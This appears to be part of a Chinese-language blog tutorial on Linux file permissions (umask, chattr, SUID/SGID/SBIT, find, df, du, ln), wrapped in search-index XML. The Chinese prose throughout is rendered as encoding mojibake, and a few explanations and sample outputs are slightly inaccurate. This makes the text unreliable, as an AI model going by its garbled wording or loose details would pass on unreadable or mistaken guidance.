title="æ–‡ä»¶é»˜è®¤æƒé™ï¼šumask"></a>æ–‡ä»¶é»˜è®¤æƒé™ï¼šumask</h3><p>Linuxä¸‹è¾“å…¥ä¼šè¿”å›4ä¸ªæ•°å­—ï¼Œä¸æƒé™ç›¸å…³çš„æ˜¯åä¸‰ä¸ªï¼Œè€Œmacä¸‹åªè¿”å›åä¸‰ä¸ªæ•°å­—ï¼Œè€Œä¸¤è€…è¿”å›çš„ä»£è¡¨æƒé™çš„æ•°å­—éƒ½ç­‰äº<code>é»˜è®¤å€¼-æƒé™åˆ†æ•°</code></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">umask   #åœ¨ï½ä¸‹æ‰§è¡Œ,åŠ -Sä¼šä»¥å­—æ¯å½¢å¼å›æ˜¾ u=rwx,g=rx,o=rx</span><br><span class="line">022     #å›æ˜¾ Linuxä¸‹æ˜¯0022</span><br><span class="line">cd /</span><br><span class="line">ls -al | grep sloth</span><br><span class="line">drwxr-xr-x   5 sloth  wheel   160 May  9 18:51 opt # å›æ˜¾ å¯è§æƒé™åˆ†æ•°æ˜¯755</span><br></pre></td></tr></table></figure></div><h4 id="ä¸¤ç§é»˜è®¤å€¼"><a href="#ä¸¤ç§é»˜è®¤å€¼" class="headerlink" title="ä¸¤ç§é»˜è®¤å€¼"></a>ä¸¤ç§é»˜è®¤å€¼</h4><ul><li>æ–°å»ºæ–‡ä»¶æ—¶ï¼Œé»˜è®¤å€¼(rw-rw-rw-)ä¸º666ï¼Œé»˜è®¤æ²¡æœ‰å¯æ‰§è¡Œæƒé™,å› æ­¤æ–°å»ºçš„æ–‡ä»¶æƒé™åˆ†æ•°ä¸º<code>666-022=644</code> <code>022</code>ä¸ºumaskï¼Œå¯è®¾ç½®</li><li>æ–°å»ºç›®å½•æ—¶ï¼Œé»˜è®¤å€¼(rwxrwxrwx)ä¸º777ï¼Œå› ä¸ºxæƒé™ä¸è¿›å…¥æ­¤ç›®å½•æœ‰å…³ï¼Œå› æ­¤æ–°å»ºçš„ç›®å½•æƒé™åˆ†æ•°ä¸º<code>777-022=755</code></li></ul><h3 id="æ–‡ä»¶éšè—å±æ€§"><a href="#æ–‡ä»¶éšè—å±æ€§" class="headerlink" title="æ–‡ä»¶éšè—å±æ€§"></a>æ–‡ä»¶éšè—å±æ€§</h3><p>è®¾ç½®</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chattr [+-=][ASacdistu] æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">A  è®¾ç½®åè®¿é—®æ–‡ä»¶æˆ–ç›®å½•åï¼Œatimeä¸æ”¹å˜</span><br><span class="line">S  è®¾ç½®åæ‰€æœ‰æ”¹åŠ¨åŒæ­¥å†™å…¥ç£ç›˜</span><br><span class="line">a  è®¾ç½®ååªèƒ½å¢åŠ æ•°æ®ï¼Œrootæ‰èƒ½è®¾ç½®(å¸¸ç”¨)</span><br><span class="line">c  è®¾ç½®åè‡ªåŠ¨å‹ç¼©</span><br><span class="line">d  è®¾ç½®åæ”¹æ–‡ä»¶æˆ–ç›®å½•ä¸ä¼šè¢«dumpå¤‡ä»½</span><br><span class="line">i  è®¾ç½®åè¯¥æ–‡ä»¶ä¸èƒ½è¢«åˆ é™¤ã€æ”¹åã€æ— æ³•å†™å…¥æ·»åŠ æ•°æ®ï¼Œåªæœ‰rootå¯ä»¥è®¾ç½®(å¸¸ç”¨)</span><br><span class="line">s  è®¾ç½®åè‹¥è¢«åˆ é™¤ï¼Œä¼šè¢«å®Œå…¨ä»ç£ç›˜ç©ºé—´ä¸­åˆ é™¤</span><br><span class="line">u  ä¸sç›¸åï¼Œè‹¥è¢«åˆ é™¤è¿˜ä¼šä¿ç•™åœ¨ç£ç›˜ä¸­ï¼Œå¯æ‰¾å›</span><br></pre></td></tr></table></figure></div><p>æ˜¾ç¤º</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsattr [-adR] æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">-a  éšè—æ–‡ä»¶çš„å±æ€§ä¹Ÿæ˜¾ç¤º</span><br><span class="line">-d  è‹¥æ“ä½œç›®å½•ï¼Œä»…åˆ—å‡ºç›®å½•æœ¬èº«å±æ€§ï¼Œä¸é€’å½’</span><br><span class="line">-R  é€’å½’</span><br></pre></td></tr></table></figure></div><h3 id="æ–‡ä»¶ç‰¹æ®Šæƒé™"><a href="#æ–‡ä»¶ç‰¹æ®Šæƒé™" class="headerlink" title="æ–‡ä»¶ç‰¹æ®Šæƒé™"></a>æ–‡ä»¶ç‰¹æ®Šæƒé™</h3><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>å½“så‡ºç°åœ¨useræƒé™çš„xä½ç½®ä¸Šï¼Œe.g. -rwsr-xr-x</p><ul><li>é’ˆå¯¹æ–‡ä»¶</li><li>ä»…å¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰æ•ˆ</li><li>æ‰§è¡Œè€…å¯¹äºè¯¥ç¨‹åºè¦æœ‰xæƒé™</li><li>æ‰§è¡Œè€…åœ¨æ‰§è¡Œç¨‹åºè¿‡ç¨‹ä¸­<u>æš‚æ—¶</u>å…·æœ‰userçš„æƒé™</li></ul><h4 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h4><p>så‡ºç°åœ¨groupæƒé™çš„xä½ç½®ä¸Š</p><ul><li>é’ˆå¯¹æ–‡ä»¶æˆ–ç›®å½•</li><li>å¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰ç”¨</li><li>æ‰§è¡Œè€…å¯¹äºè¯¥ç¨‹åºè¦æœ‰xæƒé™</li><li>æ‰§è¡Œè€…åœ¨æ‰§è¡Œç¨‹åºè¿‡ç¨‹ä¸­<u>æš‚æ—¶</u>å…·æœ‰groupçš„æƒé™</li></ul><h4 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h4><ul><li>ä»…é’ˆå¯¹ç›®å½•</li><li>ç”¨æˆ·åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶æˆ–ç›®å½•æ—¶ï¼Œåªæœ‰è‡ªå·±ä¸rootæ‰æœ‰æƒåˆ é™¤è¯¥æ–‡ä»¶ï¼Œä¹Ÿæ— æ³•æ”¹åŠ¨ä»–äººæ–‡ä»¶</li></ul><h4 id="ç‰¹æ®Šæƒé™çš„è®¾ç½®"><a href="#ç‰¹æ®Šæƒé™çš„è®¾ç½®" class="headerlink" title="ç‰¹æ®Šæƒé™çš„è®¾ç½®"></a>ç‰¹æ®Šæƒé™çš„è®¾ç½®</h4><p>å‰é¢æ‰€æçš„æƒé™åˆ†æ•°éƒ½æ˜¯ä¸‰ä½æ•°å­—ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è®¾ç½®æƒé™åˆ†æ•°æ—¶åœ¨å¼€å¤´åŠ ä¸Šä»£è¡¨ç‰¹æ®Šæƒé™çš„ç¬¬å››ä½æ•°å­—(ç‰¹æ®Šæƒé™å¯å åŠ )</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">4  SUID</span><br><span class="line">2  SGID</span><br><span class="line">1  SBIT</span><br><span class="line">chmod 4775 test1 #åŠ ä¸ŠSUID</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwsrwxr-x</span></span><br><span class="line">chmod 7666 test2 #åŠ ä¸Šä¸‰ç§</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwSrwSrwT</span></span><br><span class="line">chmod 4666 test3 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwSrw-rw-</span></span><br><span class="line">chmod 6666 test4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwSrwSrw-</span></span><br><span class="line">chmod 1666 test5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drw-rw-rwT</span></span><br><span class="line">chmod 1766 test5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwxrw-rwT</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç¬¦å·æ³•</span></span><br><span class="line">u+s #SUID</span><br><span class="line">g+s #SGID</span><br><span class="line">o+t #SBIT</span><br></pre></td></tr></table></figure></div><blockquote><p>ä»ä¸Šé¢çš„æ¡ˆä¾‹å¯ä»¥çœ‹å‡ºï¼Œå½“useræ²¡æœ‰xæ—¶åŠ ä¸ŠSUIDä¼šç”¨Så¡«å……è¡¨ç¤ºç©ºï¼ŒåŒç†å½“groupæƒé™æ²¡æœ‰xæ—¶åŠ SGIDä¼šç”¨Så¡«å……è¡¨ç¤ºç©ºï¼Œè€ŒSBITåœ¨othersæ²¡æœ‰xæ—¶ä»¥Tå¡«å……è¡¨ç¤ºç©º</p></blockquote><h3 id="æŸ¥çœ‹æ–‡ä»¶ç±»å‹-file"><a href="#æŸ¥çœ‹æ–‡ä»¶ç±»å‹-file" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶ç±»å‹:file"></a>æŸ¥çœ‹æ–‡ä»¶ç±»å‹:file</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file æ–‡ä»¶æˆ–ç›®å½•è·¯å¾„</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å›æ˜¾</span></span><br><span class="line">è·¯å¾„:æ ¼å¼ç±»å‹ä¿¡æ¯(åŒ…æ‹¬æœ‰æ²¡æœ‰ä½¿ç”¨åˆ°åŠ¨æ€å‡½æ•°åº“ç­‰ä¿¡æ¯)  (è¿™é‡Œçš„è·¯å¾„å–å†³äºä½ è¾“å…¥å‘½ä»¤ä¸­çš„è·¯å¾„ï¼Œä¸ä¸€å®šæ˜¯ç»å¯¹è·¯å¾„)</span><br></pre></td></tr></table></figure></div><h2 id="0x06-å‘½ä»¤ä¸æ–‡ä»¶çš„æŸ¥è¯¢"><a href="#0x06-å‘½ä»¤ä¸æ–‡ä»¶çš„æŸ¥è¯¢" class="headerlink" title="0x06 å‘½ä»¤ä¸æ–‡ä»¶çš„æŸ¥è¯¢"></a>0x06 å‘½ä»¤ä¸æ–‡ä»¶çš„æŸ¥è¯¢</h2><h3 id="è„šæœ¬æ–‡ä»¶åæŸ¥è¯¢"><a href="#è„šæœ¬æ–‡ä»¶åæŸ¥è¯¢" class="headerlink" title="è„šæœ¬æ–‡ä»¶åæŸ¥è¯¢"></a>è„šæœ¬æ–‡ä»¶åæŸ¥è¯¢</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">which [-a] command</span><br><span class="line">-a:åˆ—å‡ºæ‰€æœ‰åŒåå‘½ä»¤</span><br></pre></td></tr></table></figure></div><h3 id="æ–‡ä»¶åæŸ¥æ‰¾"><a href="#æ–‡ä»¶åæŸ¥æ‰¾" class="headerlink" title="æ–‡ä»¶åæŸ¥æ‰¾"></a>æ–‡ä»¶åæŸ¥æ‰¾</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whereis [options] æ–‡ä»¶æˆ–ç›®å½•å</span><br><span class="line">-b:åªæ‰¾äºŒè¿›åˆ¶æ–‡ä»¶</span><br><span class="line">-m:åªæ‰¾åœ¨è¯´æ˜æ–‡ä»¶manualè·¯å¾„ä¸‹çš„æ–‡ä»¶</span><br><span class="line">-s:åªæ‰¾sourceæºæ–‡ä»¶</span><br><span class="line">-u:é™¤ä»¥ä¸Šä¸‰ç§å¤–çš„å…¶ä»–ç‰¹æ®Šæ–‡ä»¶</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">locate [options] keyword</span><br><span class="line">-i:å¿½ç•¥å¤§å°å†™å·®å¼‚</span><br><span class="line">-r:åé¢å¯æ¥æ­£åˆ™</span><br></pre></td></tr></table></figure></div><h4 id="findå‘½ä»¤â€“ç£ç›˜ä¸­æŸ¥æ‰¾ï¼Œæ—¶é—´è¾ƒé•¿ï¼ŒåŠŸèƒ½å¼ºå¤§"><a href="#findå‘½ä»¤â€“ç£ç›˜ä¸­æŸ¥æ‰¾ï¼Œæ—¶é—´è¾ƒé•¿ï¼ŒåŠŸèƒ½å¼ºå¤§" class="headerlink" title="findå‘½ä»¤â€“ç£ç›˜ä¸­æŸ¥æ‰¾ï¼Œæ—¶é—´è¾ƒé•¿ï¼ŒåŠŸèƒ½å¼ºå¤§"></a>findå‘½ä»¤â€“ç£ç›˜ä¸­æŸ¥æ‰¾ï¼Œæ—¶é—´è¾ƒé•¿ï¼ŒåŠŸèƒ½å¼ºå¤§</h4><p><a class="link"   href="https://wangchujiang.com/linux-command/c/find.html" >https://wangchujiang.com/linux-command/c/find.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>æ—¶é—´ç›¸å…³å‚æ•°</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find [PATH] [option] [action]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ ä¸æ—¶é—´ç›¸å…³å‚æ•°ï¼Œä¸‹é¢ä»¥-mtimeä¸ºä¾‹</span></span><br><span class="line">-mtime n : nå¤©ä¹‹å‰çš„â€œä¸€å¤©å†…â€è¢«æ›´æ”¹æ–‡ä»¶</span><br><span class="line">-mtime +n : nå¤©ä¹‹å‰(ä¸å«næœ¬èº«ï¼ŒåŒ…æ‹¬å¾€å‰æ‰€æœ‰æ—¶é—´)è¢«æ›´æ”¹æ–‡ä»¶</span><br><span class="line">-mtime -n : nå¤©ä¹‹å†…(å«næœ¬èº«)è¢«æ›´æ”¹æ–‡ä»¶</span><br><span class="line">-newer æ–‡ä»¶: åˆ—å‡ºæ¯”è¯¥æ–‡ä»¶æ›´æ–°çš„æ–‡ä»¶</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">åˆ—å‡ºè¿‡å»24å°æ—¶å†…è¢«ä¿®æ”¹æ–‡ä»¶</span></span><br><span class="line">find / -mtime 0</span><br></pre></td></tr></table></figure></div><p>ç”¨æˆ·ã€ç”¨æˆ·ç»„ç›¸å…³å‚æ•°</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-uid n </span><br><span class="line">-gid n</span><br><span class="line">-user name</span><br><span class="line">-group name</span><br><span class="line">-nouser   :æ‰¾å‡ºæ–‡ä»¶æ‰€æœ‰è€…ä¸åœ¨/etc/passwdä¸­çš„</span><br><span class="line">-nogroup  :æ‰¾å‡ºæ–‡ä»¶æ‰€æœ‰ç”¨æˆ·ç»„ä¸åœ¨/etc/passwdä¸­çš„</span><br></pre></td></tr></table></figure></div><blockquote><p>æ‰¾åˆ°ä¸å±äºç³»ç»Ÿä»»ä½•äººçš„æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯æ›¾ç»ä¸‹è½½ç”¨äºç¼–è¯‘è½¯ä»¶çš„æºç </p></blockquote><p>æ–‡ä»¶æƒé™ã€åç§°ç›¸å…³å‚æ•°</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-name filename</span><br><span class="line">-size [+-]SIZE :æ‰¾æ¯”SIZEå¤§(+)æˆ–å°(-)çš„,cè¡¨ç¤ºbyteï¼Œkè¡¨ç¤ºKBï¼Œe.g. -size +50k</span><br><span class="line">-type TYPE: æ­£è§„æ–‡ä»¶(f)ã€è®¾å¤‡æ–‡ä»¶(b,c)ã€ç›®å½•(d)ã€è¿æ¥æ–‡ä»¶(l)ã€socket(s)ã€FIFO(p)ç­‰</span><br><span class="line">-perm æƒé™åˆ†æ•°</span><br><span class="line">-perm -mode :æ‰¾å‡ºæƒé™åˆ†æ•°æ¯”modeå¤§çš„æ–‡ä»¶   e.g. -perm -0744</span><br><span class="line">-perm +mode :æ‰¾å‡ºæƒé™ä¸­åŒ…å«ä»»ä¸€modeæƒé™çš„</span><br></pre></td></tr></table></figure></div><p>å…¶ä»–å‚æ•°</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-exec command &#123;&#125;\;  :åæ¥commandå¤„ç†æŸ¥è¯¢ç»“æœï¼Œä½†ä¸æ”¯æŒå‘½ä»¤åˆ«åalias</span><br><span class="line">-print : æ‰“å°ï¼Œè¿™æ˜¯é»˜è®¤æ“ä½œ</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">èŒƒä¾‹</span></span><br><span class="line">find / -perm +7000 -exec ls -l &#123;&#125;\;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å°†å«æœ‰éšè—æƒé™çš„æ–‡ä»¶æ‰¾å‡ºå¹¶ä»¥<span class="built_in">ls</span> -læ–¹å¼åˆ—å‡ºæ¥</span></span><br></pre></td></tr></table></figure></div><blockquote><p>findçš„ç»“æœè¢«æ”¾å…¥â€™{}â€™ä¸­ï¼Œå‘½ä»¤ä»¥â€™;â€˜ä¸ºç»“æŸæ ‡å¿—,å› ä¸ºâ€™;â€™åœ¨bashä¸‹æœ‰ç‰¹æ®Šæ„ä¹‰è¦è½¬ä¹‰</p></blockquote><h2 id="0x07-æƒé™ä¸å‘½ä»¤é—´å…³ç³»"><a href="#0x07-æƒé™ä¸å‘½ä»¤é—´å…³ç³»" class="headerlink" title="0x07 æƒé™ä¸å‘½ä»¤é—´å…³ç³»"></a>0x07 æƒé™ä¸å‘½ä»¤é—´å…³ç³»</h2><h3 id="ç”¨æˆ·å¯è¿›å…¥ç›®å½•æˆä¸ºå¯å·¥ä½œç›®å½•"><a href="#ç”¨æˆ·å¯è¿›å…¥ç›®å½•æˆä¸ºå¯å·¥ä½œç›®å½•" class="headerlink" title="ç”¨æˆ·å¯è¿›å…¥ç›®å½•æˆä¸ºå¯å·¥ä½œç›®å½•"></a>ç”¨æˆ·å¯è¿›å…¥ç›®å½•æˆä¸ºå¯å·¥ä½œç›®å½•</h3><ul><li>å¯ä½¿ç”¨å‘½ä»¤ï¼šcdç­‰åˆ‡æ¢å·¥ä½œç›®å½•</li><li>ç›®å½•æ‰€éœ€æƒé™ï¼šè‡³å°‘æ˜¯x</li><li>é¢å¤–éœ€æ±‚ï¼šè‹¥æƒ³æ‰§è¡ŒlsæŸ¥é˜…ç›®å½•å†…æ–‡ä»¶åï¼Œå¯¹ç›®å½•è¿˜è¦ræƒé™</li></ul><h3 id="ç”¨æˆ·è¯»å–ç›®å½•å†…å†…æŸä¸€æ–‡ä»¶"><a href="#ç”¨æˆ·è¯»å–ç›®å½•å†…å†…æŸä¸€æ–‡ä»¶" class="headerlink" title="ç”¨æˆ·è¯»å–ç›®å½•å†…å†…æŸä¸€æ–‡ä»¶"></a>ç”¨æˆ·è¯»å–ç›®å½•å†…å†…æŸä¸€æ–‡ä»¶</h3><ul><li>å¯ä½¿ç”¨å‘½ä»¤ï¼šcatã€moreã€lessç­‰</li><li>ç›®å½•æ‰€éœ€æƒé™ï¼šè‡³å°‘æ˜¯x</li><li>æ–‡ä»¶æ‰€éœ€æƒé™ï¼šè‡³å°‘æ˜¯r</li></ul><h3 id="ç”¨æˆ·ä¿®æ”¹æŸä¸€æ–‡ä»¶"><a href="#ç”¨æˆ·ä¿®æ”¹æŸä¸€æ–‡ä»¶" class="headerlink" title="ç”¨æˆ·ä¿®æ”¹æŸä¸€æ–‡ä»¶"></a>ç”¨æˆ·ä¿®æ”¹æŸä¸€æ–‡ä»¶</h3><ul><li>ç›®å½•æ‰€éœ€æƒé™ï¼šè‡³å°‘æ˜¯x</li><li>æ–‡ä»¶æ‰€éœ€æƒé™ï¼šè‡³å°‘æ˜¯rã€w</li></ul><h3 id="ç”¨æˆ·åˆ›å»ºä¸€ä¸ªæ–‡ä»¶"><a href="#ç”¨æˆ·åˆ›å»ºä¸€ä¸ªæ–‡ä»¶" class="headerlink" title="ç”¨æˆ·åˆ›å»ºä¸€ä¸ªæ–‡ä»¶"></a>ç”¨æˆ·åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</h3><ul><li>ç›®å½•æ‰€éœ€ï¼šè‡³å°‘æ˜¯wã€x</li></ul><h4 id="ç”¨æˆ·è¿›å…¥æŸç›®å½•å¹¶æ‰§è¡Œè¯¥ç›®å½•ä¸‹æŸå‘½ä»¤"><a href="#ç”¨æˆ·è¿›å…¥æŸç›®å½•å¹¶æ‰§è¡Œè¯¥ç›®å½•ä¸‹æŸå‘½ä»¤" class="headerlink" title="ç”¨æˆ·è¿›å…¥æŸç›®å½•å¹¶æ‰§è¡Œè¯¥ç›®å½•ä¸‹æŸå‘½ä»¤"></a>ç”¨æˆ·è¿›å…¥æŸç›®å½•å¹¶æ‰§è¡Œè¯¥ç›®å½•ä¸‹æŸå‘½ä»¤</h4><ul><li>ç›®å½•æ‰€éœ€æƒé™ï¼šè‡³å°‘æ˜¯x</li><li>æ–‡ä»¶æ‰€éœ€æƒé™ï¼šè‡³å°‘æ˜¯x</li></ul><h3 id="èŒƒä¾‹"><a href="#èŒƒä¾‹" class="headerlink" title="èŒƒä¾‹"></a>èŒƒä¾‹</h3><p>ç”¨æˆ·èƒ½æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /dir1/file1  /dir2</span><br></pre></td></tr></table></figure></div><ul><li>dir1ç›®å½•:è‡³å°‘æœ‰x</li><li>file1æ–‡ä»¶:è‡³å°‘æœ‰r</li><li>dir2ç›®å½•:è‡³å°‘æœ‰wã€x</li></ul><h1 id="æ–‡ä»¶ç³»ç»Ÿçš„ç®€å•æ“ä½œ"><a href="#æ–‡ä»¶ç³»ç»Ÿçš„ç®€å•æ“ä½œ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿçš„ç®€å•æ“ä½œ"></a>æ–‡ä»¶ç³»ç»Ÿçš„ç®€å•æ“ä½œ</h1><h2 id="æŸ¥çœ‹ç£ç›˜ä¸ç›®å½•çš„å®¹é‡"><a href="#æŸ¥çœ‹ç£ç›˜ä¸ç›®å½•çš„å®¹é‡" class="headerlink" title="æŸ¥çœ‹ç£ç›˜ä¸ç›®å½•çš„å®¹é‡"></a>æŸ¥çœ‹ç£ç›˜ä¸ç›®å½•çš„å®¹é‡</h2><h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">df [options] [ç›®å½•å/æ–‡ä»¶å]</span><br><span class="line">-a: åˆ—å‡ºæ‰€æœ‰ï¼ŒåŒ…æ‹¬ç‰¹æœ‰çš„/proc</span><br><span class="line">-k: ä»¥KBå•ä½æ˜¾ç¤º</span><br><span class="line">-m: ä»¥MBå•ä½</span><br><span class="line">-h: è‡ªåŠ¨åŠ ä¸Šå•ä½(å¦‚æ˜¾ç¤º12K)</span><br><span class="line">-H: ä½¿ç”¨M=1000Kçš„æ¢ç®—</span><br><span class="line">-T: è¿åŒè¯¥åˆ†åŒºçš„æ–‡ä»¶ç³»ç»Ÿåç§°ä¹Ÿåˆ—å‡º</span><br><span class="line">-i: ä»¥inodeæ•°é‡æ˜¾ç¤º</span><br></pre></td></tr></table></figure></div><blockquote><ul><li>inode:ä¸€ä¸ªæ–‡ä»¶å ç”¨ä¸€ä¸ªinodeï¼Œinodeè®°å½•æ–‡ä»¶çš„å±æ€§,ä¹Ÿè®°å½•æ­¤æ–‡ä»¶çš„æ•°æ®æ‰€åœ¨çš„blockå·ç </li><li>block:è®°å½•æ–‡ä»¶å†…å®¹ï¼Œè‹¥æ–‡ä»¶å¤ªå¤§ï¼Œä¼šå ç”¨å¤šä¸ªblock</li><li>super block: è®°å½•æ­¤æ–‡ä»¶ç³»ç»Ÿçš„æ•´ä½“ä¿¡æ¯</li></ul></blockquote><h3 id="du"><a href="#du" class="headerlink" title="du"></a>du</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">du [options] æ–‡ä»¶æˆ–ç›®å½•å</span><br><span class="line">-a: æ‰€æœ‰</span><br><span class="line">-h: è‡ªåŠ¨åŠ ä¸Šå•ä½</span><br><span class="line">-s: åˆ—å‡ºæ€»é‡</span><br><span class="line">-S: åˆ—å‡ºæ€»é‡ï¼Œä½†ä¸åŒ…æ‹¬å­ç›®å½•</span><br><span class="line">-k: kb</span><br><span class="line">-m: mb</span><br></pre></td></tr></table></figure></div><h2 id="è¿æ¥æ–‡ä»¶"><a href="#è¿æ¥æ–‡ä»¶" class="headerlink" title="è¿æ¥æ–‡ä»¶"></a>è¿æ¥æ–‡ä»¶</h2><h3 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln [options] æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶</span><br><span class="line">-s: ä¸åŠ -så°±æ˜¯ç¡¬è¿æ¥ï¼ŒåŠ -så°±æ˜¯symbolic link</span><br><span class="line">-f: å¦‚æœç›®æ ‡æ–‡ä»¶å­˜åœ¨ï¼Œä¸»åŠ¨å°†ç›®æ ‡æ–‡ä»¶ç›´æ¥åˆ é™¤ä»»ä½•å†åˆ›å»º</span><br></pre></td></tr></table></figure></div><blockquote><ul><li><p>ç¡¬è¿æ¥ï¼šä½¿å¾—ä¸¤ä¸ªæ–‡ä»¶è¿æ¥åˆ°åŒä¸€ä¸ªinode,äºŒè€…é™¤æ–‡ä»¶åä»¥å¤–ä¸€æ‘¸ä¸€æ ·</p><ul><li>ä¸èƒ½è·¨æ–‡ä»¶ç³»ç»Ÿã€ä¸èƒ½è¿æ¥åˆ°ç›®å½•</li></ul></li><li><p>symbolic link: ç¬¦å·è¿æ¥ï¼Œå¿«æ·æ–¹å¼</p><ul><li>åˆ é™¤æºæ–‡ä»¶ï¼Œä¼šå¯¼è‡´ç›®æ ‡æ–‡ä»¶æ‰“å¼€ä¸äº†</li></ul></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
